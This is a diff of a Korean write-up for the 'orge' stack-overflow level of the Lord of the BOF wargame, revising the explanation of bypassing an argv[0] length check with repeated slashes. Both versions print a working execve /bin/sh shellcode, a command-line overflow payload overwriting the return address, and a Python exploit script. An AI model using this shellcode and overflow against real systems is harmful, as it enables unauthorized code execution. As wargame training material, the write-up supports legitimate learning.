@@ -69,8 +69,6 @@ main(int argc, char *argv[])
 }
 ```
 
-
-
 ------
 
 ### 0x01. Analysis
@@ -87,19 +85,21 @@ argv[0]의 길이가 77이여야 한는 코드가 추가되었다.
 
 argv[0]는 파일실행경로값이 들어가게 된다.
 
-<img src="http://eliez3r.synology.me/assets/img/writeup/lob/07.orge/image-20180829172758642.png" width="600px">
+<img src="http://eliez3r.synology.me/assets/img/writeup/lob/07.orge/image-20180829172758642.png" width="600px">{:.rounded.shadow}
+
+<br> 
 
 shell에는 다음과 같은 기능(?)이 있다.
 
-<img src="http://eliez3r.synology.me/assets/img/writeup/lob/07.orge/image-20180829172938587.png" width="600px">
+<img src="http://eliez3r.synology.me/assets/img/writeup/lob/07.orge/image-20180829172938587.png" width="600px">{:.rounded.shadow}
 
-경로명에 '/'를 여러개 넣어도 1개로 인식하여 파일이 실행된다. 하지만 argv[0]의 길이에는 포함이 된다.
-
+경로명에 '/'를 여러개 넣어도 1개로 인식하여 파일이 실행된다. 하지만 argv[0]의 길이는 늘어나는 셈이다.  
 이를 이용하여 길이를 77바이트로 만들면 될것 같다.
 
 나머지 문제 풀이법은 darkelf와 같다.
 
 - buffer 배열 크기 40byte
+- **argv[0]의 길이가 77인지 검증**
 - 환경변수 영역 0으로 초기화 (egghunter)
 - RET 첫 1byte '\xbf'로 시작
 - argv[1] 48byte 길이 미만
@@ -110,35 +110,31 @@ shell에는 다음과 같은 기능(?)이 있다.
 
 ### 0x02. Exploit
 
-core 덤프를 떨궈 쉘코가 들어갈 주소를 구하자.
+core 덤프를 떨궈 shellcode가 들어갈 argv[2]의 주소를 구하자.
 
-<img src="http://eliez3r.synology.me/assets/img/writeup/lob/07.orge/image-20180829173302690.png" width="800px">
+<img src="http://eliez3r.synology.me/assets/img/writeup/lob/07.orge/image-20180829173302690.png" width="850px">{:.rounded.shadow}
 
+<img src="http://eliez3r.synology.me/assets/img/writeup/lob/07.orge/image-20180829173436809.png" width="650px">{:.rounded.shadow}
 
+이제 쉘코드를 넣고 RET주소에 0xbffffb64 를 넣으면 끄읏~
 
-<img src="http://eliez3r.synology.me/assets/img/writeup/lob/07.orge/image-20180829173436809.png" width="650px">
-
-
+<br>
 
 ```
 shell(24byte) = \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
 ```
 
-이제 쉘코드를 넣고 RET주소에 0xbffffb64 를 넣으면 끄읏~
+<img src="http://eliez3r.synology.me/assets/img/writeup/lob/07.orge/image-20180829173636979.png" width="850px">{:.rounded.shadow}
 
-
-
-<img src="http://eliez3r.synology.me/assets/img/writeup/lob/07.orge/image-20180829173636979.png" width="800px">
-
-```
-/home/darkelf////////////////////////////////////////////////////////////orge `python -c 'print "A"*44+"\x64\xfb\xff\xbf"'` `python -c 'print "\x90"*50+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"'`
+```shell
+[darkelf@localhost darkelf]$ /home/darkelf////////////////////////////////////////////////////////////orge `python -c 'print "A"*44+"\x64\xfb\xff\xbf"'` `python -c 'print "\x90"*50+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"'`
 ```
 
 -----
 
 ### 0x03. 정리
 
-argv[0]의 길이를 체크하는 메커니즘이 들어 갔으며, 쉘기능을 사용하여 argv[0] 길이 체크 메커니즘을 우회하였다.
+orge 문제에는 argv[0]의 길이를 검증하는 로직이 추가되었으며, 쉘기능을 사용하여 argv[0] 길이 검증을 우회할 수 있었다.
 
 -----
 
@@ -153,10 +149,10 @@ target = "/home/darkelf/" + "/"*59 + "orge"
 print len(target)
 
 shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
-shellcode_addr = 0xbffffd20
+argv2_addr = 0xbffffd20
 
 payload1 = "\x90"*44
-payload1 = append(payload1, p32(shellcode_addr))
+payload1 = append(payload1, p32(argv2_addr))
 
 payload2 = "\x90"*50
 payload2 = append(payload2, shellcode)
@@ -169,7 +165,7 @@ else:
         os.waitpid(pid, 0)
 ```
 
-> python script로 할 때는 주소가 다를 수 있음
+> <u>python script로 exploit 할 때는 실제 주소가 다를 수 있음</u>
 
 -----
 
